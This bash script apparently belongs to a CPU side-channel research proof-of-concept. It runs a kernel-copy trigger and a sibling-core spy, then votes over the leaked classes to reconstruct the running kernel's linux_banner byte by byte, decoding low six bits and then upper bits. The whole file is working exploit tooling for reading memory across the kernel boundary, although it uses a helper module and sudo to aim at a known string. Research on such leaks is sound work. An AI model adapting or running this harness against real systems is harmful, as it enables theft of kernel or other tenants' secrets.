#!/usr/bin/env bash
# Stage 2 M3b: reconstruct bytes of the running kernel's linux_banner
# through the bytewalk copy-engine leak (SMT sibling sampler).
#
# Usage (as the normal user, from this directory):
#   bash banner.sh                # gate + 6-bit pass + ESHIFT pass
#   COUNT=64 bash banner.sh       # shorter walk
#
# Same window geometry as reconstruct.sh: a 1-byte rep movsb loop at
# allocation offset P exposes bytes [P+16 .. P+23] in the spy's round-0
# rows (row r = byte P+16+r). Banner byte i is read at OFFSET = i - 16
# with TARGET=banner: ktrigger resolves linux_banner via kallsyms (root)
# and rebases the offset, so the script runs the trigger under sudo (the
# password is cached once with `sudo -v`). The 6-bit pass gives
# low6 = class ^ 0x3f; the second pass runs the SAME walk with spy
# ESHIFT=2, which shifts the leaked qword inside the encoder and exposes
# bits 7..2 (b6 = z>>4&1, b7 = z>>5&1) -- no page rotation needed for
# foreign (kernel image) memory. Logs: /tmp/recb-*.log
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$HERE"

if [ ! -e /dev/gds_helper_lkm ]; then
    echo "error: /dev/gds_helper_lkm not present; run: bash reload.sh text" >&2
    exit 2
fi

sudo -v || exit 2

COUNT=${COUNT:-128}
LEAD=${LEAD:-16}
BURST=${BURST:-16384}
ROUNDS=${ROUNDS:-2}
TRIALS=${TRIALS:-64}
LOADS=${LOADS:-4}
MINHITS=${MINHITS:-8}
RUNID=$(date +%H%M%S)

sudo pkill -x ktrigger 2>/dev/null || true

row_classes() { # log -> "row class" lines for round 0 (class -1 if none)
    awk -v minhits="$MINHITS" '
        $1 == "round" && $2 == 0 && $5 == "top3" {
            for (i = 6; i <= 8; i++) {
                split($i, p, ":");
                if (p[1] != "-1" && p[1] != "0" &&
                    (p[2] + 0) >= minhits) {
                    print $4, p[1];
                    next
                }
            }
            print $4, -1
        }' "$1" 2>/dev/null
}

one_run() { # tag offset spy_extra -> "row class" lines for round 0
    local tag="$1" off="$2" extra="$3"
    local log="/tmp/recb-$tag-$RUNID.log"
    local kp

    sudo env CPU=3 MODE=kcopy KOP=bytewalk TARGET=banner OFFSET="$off" \
        LEN="$BURST" ./ktrigger >"$log" 2>&1 &
    kp=$!
    sleep 0.2
    sudo env CPU=1 CANARY=0x47 ROUNDS="$ROUNDS" TRIALS="$TRIALS" \
        LOADS="$LOADS" PRINT=1 $extra ../spy/spy >>"$log" 2>&1
    kill "$kp" 2>/dev/null
    wait "$kp" 2>/dev/null
    sudo pkill -x ktrigger 2>/dev/null || true
    row_classes "$log"
}

char_of() { # class -> printable candidate(s): "L", "(2|r)", or "?"
    local cls=$1 low v c s=""

    case "$cls" in "" | -1) printf '?'; return ;; esac
    low=$((cls ^ 63))
    for v in $low $((low + 64)) $((low + 128)); do
        if [ "$v" -ge 32 ] && [ "$v" -le 126 ]; then
            c=$(printf "\\$(printf '%03o' "$v")")
            s="$s$c"
        fi
    done
    case ${#s} in
        0) printf '?' ;;
        1) printf '%s' "$s" ;;
        *) printf '(%s)' "$(printf '%s' "$s" | sed 's/./&|/g; s/|$//')" ;;
    esac
}

decode_votes() { # votes file -> "byte best_class votes" sorted by byte
    awk '
        $2 != -1 { key = $1 " " $2; cnt[key]++; seen[$1] = 1 }
        END {
            for (b in seen) {
                best = -1; bestn = 0; s = ""
                for (k in cnt) {
                    split(k, kv, " ")
                    if (kv[1] + 0 == b + 0) {
                        s = s sprintf(" %s:%d", kv[2], cnt[k])
                        if (cnt[k] > bestn ||
                            (cnt[k] == bestn && kv[2] + 0 < best + 0)) {
                            best = kv[2] + 0; bestn = cnt[k]
                        }
                    }
                }
                printf "%d %d%s\n", b, best, s
            }
        }' "$1" | sort -n
}

walk() { # tag spy_extra -> "byte class" votes on stdout
    local tag="$1" extra="$2" i off r c
    for ((i = 0; i < COUNT; i++)); do
        off=$((i - LEAD))
        while read -r r c; do
            echo $((i + r)) "$c"
        done < <(one_run "$tag-i$i" "$off" "$extra")
    done
}

# roll-call gate: linux_banner starts with "Linux version "; byte 0 'L'
# (class 51) and byte 6 'v' (class 9) gate the walk, byte 1 'i' (22) is
# printed for the record.
probe() { # idx want mode -> 0/1
    local idx="$1" want="$2" mode="$3"
    local off got
    off=$((idx - LEAD))
    got=$(one_run "probe$idx" "$off" "ESHIFT=0" | awk '$1 == 0 { print $2 }')
    [ -n "$got" ] || got=-1
    echo "probe idx=$idx offset=$off want_row0=$want got_row0=$got ($mode)"
    [ "$mode" != gate ] || [ "$got" = "$want" ]
}
probe_ok=1
probe 0 51 gate || probe_ok=0
probe 6 9 gate || probe_ok=0
probe 1 22 soft || true
if [ "$probe_ok" != 1 ]; then
    echo "error: banner roll-call failed (kallsyms? module loaded?)" >&2
    exit 2
fi
echo

echo "== pass A (ESHIFT=0): window votes, low6 = class ^ 0x3f"
walk passA "ESHIFT=0" >/tmp/recb-votes-A-$RUNID.txt
decode_votes /tmp/recb-votes-A-$RUNID.txt >/tmp/recb-best-A-$RUNID.txt
while read -r b cls votes; do
    ch=$(char_of "$cls")
    printf 'byte=%2d cls=%s char=%s votes:%s\n' "$b" "$cls" "$ch" "$votes"
done </tmp/recb-best-A-$RUNID.txt

echo
echo "== pass B (spy ESHIFT=2): bits 7..2 of each byte"
walk passB "ESHIFT=2" >/tmp/recb-votes-B-$RUNID.txt
decode_votes /tmp/recb-votes-B-$RUNID.txt >/tmp/recb-best-B-$RUNID.txt
string8=""
while read -r b cls1 _v1; do
    cls2=$(awk -v b="$b" '$1 == b { print $2 }' /tmp/recb-best-B-$RUNID.txt)
    if [ "$cls1" = -1 ] || [ -z "$cls2" ] || [ "$cls2" = -1 ]; then
        printf 'byte=%2d clsA=%s clsB=%s (incomplete)\n' \
            "$b" "$cls1" "${cls2:-?}"
        [ "$b" -lt "$COUNT" ] && string8="$string8?"
        continue
    fi
    low1=$((cls1 ^ 63))
    z=$((cls2 ^ 63))
    byt=$((((z >> 5) & 1) * 128 + ((z >> 4) & 1) * 64 + low1))
    if [ "$byt" -ge 32 ] && [ "$byt" -le 126 ]; then
        ch=$(printf "\\$(printf '%03o' "$byt")")
    else
        ch=$(printf '(x%02x)' "$byt")
    fi
    printf 'byte=%2d clsA=%s clsB=%s byte=0x%02x char=%s\n' \
        "$b" "$cls1" "$cls2" "$byt" "$ch"
    [ "$b" -lt "$COUNT" ] && string8="$string8$ch"
done </tmp/recb-best-A-$RUNID.txt
echo "banner8=$string8"

echo
echo "logs: /tmp/recb-*-$RUNID.log"
